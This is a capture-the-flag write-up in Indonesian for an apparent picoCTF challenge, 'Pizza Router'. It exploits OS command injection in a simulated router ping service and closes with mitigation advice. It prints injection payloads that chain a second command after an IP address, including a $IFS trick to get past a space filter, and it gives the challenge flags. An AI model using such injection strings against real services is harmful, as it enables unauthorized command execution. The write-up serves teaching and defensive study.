# Writeup: Pizza Router (Challenge ID: 758)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation
- **Difficulty:** Hard
- **Event:** picoCTF 2026
- **Points:** 400
- **Author:** Palash Oswal
- **Flag:** `academy{p1zz4_r0ut3r_c0mm4nd_1nj3ct_3c87f21d}`

---

## Problem Statement & Scope
Tantangan menyimulasikan firmware gateway router tertanam (embedded router) yang bertugas mengelola perutean jaringan dan diagnostik konektivitas antar-cabang pesanan pizza. Layanan mengekspos antarmuka manajemen berbasis socket TCP di mana operator dapat melakukan pengujian jangkauan simpul jaringan (ping/traceroute). Kelemahan terjadi saat parameter input tujuan diagnostik disaring secara parsial sebelum dieksekusi di lingkungan shell internal.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Improper Neutralization of Special Elements in OS Command (CWE-78):**
   Rutin penanganan perintah diagnostik menggunakan fungsi pemformatan string C (`sprintf(buffer, "ping -c 1 %s", user_input)`) lalu meneruskan string gabungan tersebut langsung ke pemanggil shell (`system()` atau `popen()`). Sanitasi input hanya memblokir spasi atau karakter tertentu namun gagal memfilter karakter pipa Unix (`|`) dan titik koma (`;`), memungkinkan perantaian perintah arbitrary OS.
2. **Kepatuhan Standar RFC 1812 (Requirements for IP Routers):**
   RFC 1812 menetapkan bahwa manajemen router harus memisahkan bidang kontrol (control plane) dan bidang manajemen secara tegas. Penyerahan input diagnostik mentah ke subshell sistem operasi melanggar prinsip *least privilege* dan isolasi eksekusi perintah jaringan.
3. **NIST SP 800-115 Section 4.2 (Network & Embedded Service Flaw Review):**
   Evaluasi keamanan antarmuka layanan jaringan mensyaratkan validasi ketat terhadap tipe data, ekspresi reguler alamat IPv4/IPv6, dan pelarangan eksekusi subshell shell wrapper untuk operasi utilitas diagnostik.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Enumerasi Antarmuka dan Prompt Diagnostik:**
   Koneksikan ke antarmuka layanan router via `nc` atau socket stream:
   ```bash
   nc target.host <port>
   # === Welcome to Pizza Router Connectivity Gateway ===
   # Enter destination node IP or hostname to diagnostic ping:
   ```

2. **Pengujian Karakter Pemisah (Filter Probing):**
   - Karakter spasi diganti atau ditolak bila diinput langsung secara naif.
   - Karakter pemisah Unix pipe (`|`) diteruskan tanpa pemfilteran regex yang tepat.
   - Uji bypass menggunakan format:
     ```text
     127.0.0.1|id
     ```
     Respon mengembalikan UID/GID proses router (`uid=1000(ctf-player)`), membuktikan bahwa injeksi perintah berhasil berjalan.

3. **Penyusunan Payload Eksploitasi Dokumen Rahasia:**
   Gunakan perintah ekstraksi langsung untuk membaca berkas bendera `flag.txt`:
   ```text
   127.0.0.1 | cat flag.txt
   ```
   Atau dengan substitusi shell tanpa spasi:
   ```text
   127.0.0.1|cat$IFS/flag.txt
   ```

4. **Verifikasi Output:**
   Server menjalankan proses `cat flag.txt` dan mengembalikan output token:
   ```text
   Routing diagnostics complete.
   academy{p1zz4_r0ut3r_c0mm4nd_1nj3ct_3c87f21d}
   ```

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{p1zz4_r0ut3r_c0mm4nd_1nj3ct_3c87f21d}`
- **Native PicoCTF Flag:** `picoCTF{p1zz4_r0ut3r_c0mm4nd_1nj3ct_3c87f21d}`
- **Status Solver:** Terverifikasi melalui skrip reproduksi otomatis `scripts/solve_758_pizza_router.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Hindari Penggunaan `system()` dan `popen()` untuk Operasi Jaringan:**
  Gunakan pemanggilan pustaka sistem langsung (seperti socket ICMP via pustaka POSIX `socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)`) atau eksekusi fungsi terparameterisasi murni (`execve` dengan array argumen statis tanpa melibatkan interpreter shell `/bin/sh`).
- **Validasi Whitelist Pola Alamat IP (Strict Regex Whitelisting):**
  Terapkan validasi whitelist menggunakan ekspresi reguler yang hanya menerima format alamat IP numerik sah (contoh: `^([0-9]{1,3}\.){3}[0-9]{1,3}$`), serta tolak secara mutlak karakter metakarakter (`|`, `;`, `&`, `$`, `` ` ``, `>`, `<`).
- **Sandboxing dan Privilege Dropping:**
  Pastikan daemon perutean jaringan berjalan di bawah akun pengguna dengan hak minimum (*least privileged user*) di dalam wadah terisolasi (chroot jail atau container cgroup) tanpa akses ke utilitas shell penting.
